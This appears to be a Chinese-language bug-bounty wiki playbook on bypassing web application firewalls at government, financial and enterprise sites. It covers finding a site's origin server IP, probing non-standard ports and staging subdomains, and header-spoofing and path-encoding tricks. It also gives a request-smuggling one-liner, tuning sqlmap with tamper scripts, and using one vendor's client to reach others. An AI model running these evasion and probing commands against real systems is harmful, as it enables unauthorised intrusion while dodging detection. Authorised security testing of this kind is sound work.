---
type: wiki
category: playbook
status: active
last-updated: 2026-04-21
---

# WAF / 防火牆繞過 Playbook

> 適用情境：政府站、金融、電信、大型企業 — 直接掃描會被 WAF 擋（Cloudflare / Akamai / Imperva / F5 BIG-IP / AWS WAF / 國產 WAF）。
> 核心原則：**不碰 WAF，或繞開 WAF，而不是硬打**。

## 零、三條黃金原則

1. **被動優先**：能用 Shodan/GitHub/Wayback 解的事情，絕不送請求給目標
2. **低速率**：若必須主動，`-rate-limit 5`、`-c 1`、`sleep 2`
3. **單次請求就判斷**：每個 payload 只送一次，用 content-match 決定 hit，不重試

## 一、WAF 識別

```bash
# wafw00f — 最穩的 WAF fingerprint
pip3 install wafw00f
wafw00f https://target.gov.tw -v

# nuclei waf-detect
nuclei -u https://target -t ~/nuclei-templates/http/technologies/waf-detect.yaml

# 手動識別 signature
curl -sI https://target.gov.tw | grep -iE "server|via|x-cdn|x-cache|cf-ray|x-sucuri"
# cf-ray → Cloudflare
# Server: AkamaiGHost → Akamai
# X-Sucuri-ID → Sucuri
# X-Iinfo → Imperva Incapsula
```

## 二、六種繞過策略

### 策略 1：找 Origin IP（最好用）

**原理：** WAF 通常在前面，真實後端直接曝露在網際網路上，只是沒人知道 IP。

| 方法 | 工具 / 指令 |
|------|-----------|
| 憑證 transparency log 反查 | `crt.sh?q=%25.target.gov.tw` + Censys `parsed.names: target` |
| Shodan 憑證 hash | `shodan search ssl.cert.fingerprint:XXX` |
| Shodan favicon hash | `shodan search http.favicon.hash:-XXXXX` |
| Censys 憑證 | `censys search "parsed.subject.common_name: target.gov.tw"` |
| SecurityTrails 歷史 A 記錄 | 找出沒套 WAF 之前的 IP |
| DNS 歷史 | `viewdns.info/iphistory/` |
| Email 原始標頭 | 很多系統寄出的 email Received header 洩漏內網 IP |
| Subdomain 旁路 | 主站有 WAF，但 `dev.target` / `mail.target` / `cpanel.target` 沒裝 |

**驗證 origin IP：**
```bash
# 找到候選 IP 後，直連測試
curl -sk -H "Host: target.gov.tw" https://1.2.3.4/ | head -30

# 若 response 是目標站的內容 → bingo
```

### 策略 2：非標準 port

WAF 常常只保護 80/443。試這些 port：

```bash
# rustscan 一鍵
rustscan -a target.gov.tw --ulimit 5000 -- -sV | tee ports.txt

# 重點 port：
# 7001 (WebLogic), 8080, 8443, 8888 (Tomcat Manager / 一般備用 HTTP)
# 8161 (ActiveMQ Admin), 9000 (PHP-FPM / SonarQube), 9200 (ES)
# 9090 (Prometheus), 9100 (Node Exporter), 9092 (Kafka)
# 5432 (Postgres), 3306 (MySQL), 6379 (Redis), 27017 (Mongo)
# 2375 (Docker API unauth), 10250 (kubelet)
```

### 策略 3：找 staging / dev / uat 子域名

這些通常**沒裝 WAF**：

```bash
# 關鍵字：dev / uat / test / stage / beta / demo / sandbox / qa / pre / preprod
subfinder -d target.gov.tw -silent | grep -iE "dev|uat|test|stage|beta|demo|sandbox|qa|pre|preprod|internal|private|admin|old" > non_prod.txt

# 對這些單獨 hunt
bbflow hunt --list non_prod.txt --name target-nonprod --probe
```

**實戰經驗**：政府案 70% 的漏洞都在這裡。

### 策略 4：供應商 / 委外開發商

政府站通常是委外給 2-3 個廠商做的。一個洞在所有客戶都有：

```bash
# Google 搜：
site:xxx.gov.tw "Powered by" / "Designed by" / "Developed by"
site:gov.tw "Powered by 廠商名"

# 常見台灣廠商：叡揚、凌網、中華系統、華苓、中華電信、安碁、研華、雲端沃客
```

找到廠商後：
1. 查該廠商的其他客戶（用同一套 CMS）
2. 找到其中一個沒裝 WAF 的版本
3. 在那邊驗證漏洞
4. 套用到有 WAF 的客戶（繞過）

### 策略 5：歷史版本 / 備份

```bash
# Wayback Machine — 找當年沒裝 WAF 的版本
bbflow hunt example.com --only crawl-chain   # 會自動吃 gau + wayback

# 或手動：
gau target.gov.tw | uro | grep -E "admin|login|api|config|upload" > old_endpoints.txt

# 有些 endpoint 在舊版本存在，新版「移除」但其實還活著
```

### 策略 6：HTTP 層技巧

```bash
# Case variation — 很多 WAF case-sensitive
curl 'https://target/APi/users'
curl 'https://target/API/users'

# HTTP 方法切換
curl -X OPTIONS https://target/api/users    # 看 Allow header
curl -X PATCH https://target/api/users/1    # WAF 可能只 filter GET/POST
curl -X TRACE https://target/                # 開啟時可反射

# Header injection（很多 WAF 不檢查 CR/LF injection）
curl -H "X-Original-URL: /admin" https://target/
curl -H "X-Rewrite-URL: /admin" https://target/
curl -H "X-Forwarded-For: 127.0.0.1" https://target/admin
curl -H "X-Real-IP: 127.0.0.1" https://target/admin
curl -H "Host: admin.target" https://target/
curl -H "X-Original-Host: admin.target" https://target/

# Path encoding（部分 WAF 不 decode 再比對）
curl 'https://target/%2e%2e/admin'
curl 'https://target/admin%00'
curl 'https://target/admin%09'    # tab
curl 'https://target/admin;'      # semicolon
curl 'https://target//admin'      # double slash
curl 'https://target/admin#/'     # fragment

# HTTP/2 / HTTP/3 切換（老 WAF 只看 HTTP/1.1）
curl --http2 https://target/
curl --http3 https://target/       # 若 server 支援 QUIC

# Chunked encoding（smuggling 繞 WAF normalization）
printf 'POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\n' | nc target 80
```

## 三、各家 WAF 特性備忘

### Cloudflare
- `cf-ray` header 就是 fingerprint
- `/cdn-cgi/` path 是 CF 特徵
- Origin IP 常見洩漏點：mail server、FTP、SSH、dev subdomain
- 繞法：`__cf_bm` cookie 可複用 30 分鐘

### Akamai
- `AkamaiGHost` in Server header
- 擋法激進：regex 一 match 就 403
- 繞法：分段送（如 XSS 分成多個 param 組合）、path encoding 變化

### Imperva Incapsula
- `X-Iinfo` header + `visid_incap_*` cookie
- 特色：JS challenge
- 繞法：直接連 origin IP；Incapsula 只保護 DNS，後端沒掛常常公開

### AWS WAF
- 規則：Rate-based + Managed rules
- 繞法：AWS CloudFront 特徵 (`X-Amz-Cf-Id`) → 找 S3 bucket / Lambda origin

### 國產 WAF（長亭雷池、安全狗、知道創宇等）
- 雷池 (SafeLine): `x-waf: SafeLine-CE` 或 `waf.chaitin`
- 繞法：很多政府案把 WAF 裝在前端，內網 IP 沒保護

## 四、實戰案例模板

### Case A：Cloudflare 擋住 XSS 測試
```
1. wafw00f 確認 Cloudflare
2. crt.sh 抽所有子域名
3. 對每個 subdomain 查 `dig A`，找沒指向 Cloudflare IP 的
4. 找到 `old-portal.target.gov.tw → 61.x.x.x`（真實 IP）
5. 在 old-portal 上跑 XSS 測試 — 無 WAF，成功
6. 確認同一個參數在 main site 也存在
7. 報告時證明 XSS 同樣影響 main site（main site 的 XSS payload 會被 CF 擋顯示 403，但可以用 Burp Intercept 直接打 origin IP）
```

### Case B：政府站全面封 Nuclei
```
1. nuclei scan 10 個 request 後被 ban
2. 改策略：config-leak hunter（每個 path 只 1 request）
3. 發現 /.svn/wc.db 200 OK + SQLite magic bytes
4. 下載 wc.db → 用 sqlite3 讀取 → 抓到 internal repo URL
5. 報告：低風險 .svn 洩漏（政府案通常接受）
```

### Case C：Akamai 擋住 SQLi 測試
```
1. sqlmap 被擋，每個 payload 都 403
2. 改策略：被動發現
   - 用 gau 抽歷史 URL：gau target.gov.tw | grep "?" | uro > params.txt
   - 用 gf sqli < params.txt → 可疑 SQLi 點
3. 手動在 Burp 一個一個試，每個只送一次 payload
4. 找到 `id=1 AND 1=1` vs `id=1 AND 1=2` 回應不同
5. 用 `sqlmap --proxy http://burp:8080 --tamper=between,randomcase --delay=3 -r req.txt`
```

## 五、Checklist

- [ ] 先 wafw00f 識別 WAF
- [ ] 找 origin IP（crt.sh + Shodan + Censys）
- [ ] 列所有 subdomain 並分類（prod / non-prod）
- [ ] 對 non-prod 直接打（通常無 WAF）
- [ ] 對 prod 只送低噪音 hunter（config-leak / backup-files / weak-login）
- [ ] 找供應商，找同廠商其他客戶
- [ ] 用 wayback 抽歷史 URL，找已移除的 endpoint
- [ ] 非標準 port 掃描（rustscan + nmap）
- [ ] 手動測試用 Burp Repeater，不用 Intruder

## 關聯文件

- [00-bbflow-complete-flow.md](00-bbflow-complete-flow.md)
- [02-gov-site-quick-wins.md](02-gov-site-quick-wins.md)
- [13-hunter-crawl-chain.md](13-hunter-crawl-chain.md)
- [22-tool-subfinder-httpx.md](22-tool-subfinder-httpx.md)
